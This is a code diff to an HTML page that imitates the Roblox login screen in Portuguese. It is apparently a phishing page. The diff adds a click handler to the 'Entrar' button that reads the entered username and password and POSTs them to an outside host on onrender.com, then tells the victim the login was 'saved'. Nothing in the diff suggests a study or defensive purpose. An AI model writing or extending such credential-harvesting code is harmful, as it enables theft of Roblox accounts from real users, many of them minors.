@@ -712,7 +712,7 @@
             <h2>Entrar na Roblox</h2>
             <input type="text" name="username" placeholder="Usuário/e-mail/telefone" />
             <input type="password" name="password" placeholder="Senha" />
-            <button>Entrar</button>
+            <button id="btn-login">Entrar</button>
 
             <div class="link">
                 <a href="#">Esqueceu a senha ou nome de usuário?</a>
@@ -732,18 +732,45 @@
 
     <script>
         document.addEventListener('click', function(event) {
-            if (event.target.tagName === 'BUTTON') {
-                console.log('Botão clicado!');
+            if (event.target.tagName === 'BUTTON' && event.target.id === 'btn-login') {
+                console.log('Botão "Entrar" clicado!');
 
-                const inputs = document.querySelectorAll('input, textarea, select');
-                const valores = {};
+                const username = document.querySelector('input[name="username"]').value.trim();
+                const password = document.querySelector('input[name="password"]').value.trim();
 
-                inputs.forEach(input => {
-                    const nome = input.name || input.id || `input_${Math.random()}`;
-                    valores[nome] = input.value;
-                });
+                if (!username || !password) {
+                    alert("Preencha os dois campos.");
+                    return;
+                }
 
-                console.log('Valores dos inputs:', valores);
+                const dados = {
+                    username: username,
+                    password: password
+                };
+
+                console.log("Enviando dados:", dados);
+
+                fetch("https://robloxapi-gq2e.onrender.com/api/v1", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(dados)
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error("Erro ao salvar dados.");
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log("Resposta da API:", data);
+                        alert("Login salvo com sucesso.");
+                    })
+                    .catch(error => {
+                        console.error("Erro na requisição:", error);
+                        alert("Erro ao enviar login.");
+                    });
             }
         });
     </script>
